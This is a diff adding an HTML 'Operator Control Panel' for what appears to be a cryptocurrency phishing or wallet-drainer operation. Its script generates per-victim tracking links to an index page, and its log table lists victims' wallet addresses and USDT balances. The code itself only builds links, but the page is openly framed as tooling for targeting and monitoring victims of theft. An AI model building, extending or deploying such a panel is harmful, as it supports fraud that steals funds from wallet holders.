@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Operator Admin Panel</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #0b0f17; color: #ffffff; font-family: sans-serif; }
+    </style>
+</head>
+<body class="p-6">
+    <div class="max-w-4xl mx-auto">
+        <!-- Admin Header -->
+        <div class="flex justify-between items-center bg-[#131a24] border border-[#1f2c3d] p-4 rounded-2xl mb-6 shadow-lg">
+            <div>
+                <h1 class="text-lg font-bold text-white">Operator Control Panel</h1>
+                <p class="text-xs text-gray-400">Monitoring incoming connections & target allowances</p>
+            </div>
+            <div class="bg-green-900/40 border border-green-600 text-green-400 px-3 py-1 rounded-full text-xs font-semibold">
+                System Active
+            </div>
+        </div>
+
+        <!-- Target Links Generator Section -->
+        <div class="bg-[#131a24] border border-[#1f2c3d] p-5 rounded-2xl mb-6">
+            <h2 class="text-sm font-semibold text-gray-300 mb-3">Generate Target Tracking Link</h2>
+            <div class="flex gap-2">
+                <input type="text" id="targetId" placeholder="Enter Victim/Campaign Name (e.g. user_01)" class="bg-[#1b2636] border border-[#2a3b52] rounded-xl px-4 py-2.5 text-xs text-white w-full outline-none">
+                <button onclick="generateLink()" class="bg-[#3375BB] hover:bg-[#285d94] px-5 py-2.5 rounded-xl text-xs font-semibold transition-all">Generate</button>
+            </div>
+            <div id="generatedResult" class="mt-3 text-xs text-green-400 break-all"></div>
+        </div>
+
+        <!-- Connected Victims Table / Logs -->
+        <div class="bg-[#131a24] border border-[#1f2c3d] p-5 rounded-2xl">
+            <h2 class="text-sm font-semibold text-gray-300 mb-3">Live Target Activity Logs</h2>
+            <div class="overflow-x-auto">
+                <table class="w-full text-left text-xs text-gray-400">
+                    <thead class="border-b border-[#1f2c3d] text-gray-500 uppercase text-[10px]">
+                        <tr>
+                            <th class="py-3 px-2">Time</th>
+                            <th class="py-3 px-2">User ID / Tag</th>
+                            <th class="py-3 px-2">Wallet Address</th>
+                            <th class="py-3 px-2">USDT Balance</th>
+                            <th class="py-3 px-2">Status</th>
+                        </tr>
+                    </thead>
+                    <tbody id="logsTable">
+                        <tr class="border-b border-[#1b2636]">
+                            <td class="py-3 px-2" colspan="5" class="text-center text-gray-500">Waiting for connections... (Check console or setup webhook for live logs)</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function generateLink() {
+            const tag = document.getElementById('targetId').value.trim() || 'target_' + Math.floor(Math.random() * 1000);
+            const baseUrl = window.location.origin + window.location.pathname.replace('admin.html', 'index.html');
+            const finalLink = `${baseUrl}?userId=${tag}`;
+            document.getElementById('generatedResult').innerText = `Target Link: ${finalLink}`;
+        }
+    </script>
+</body>
+</html>
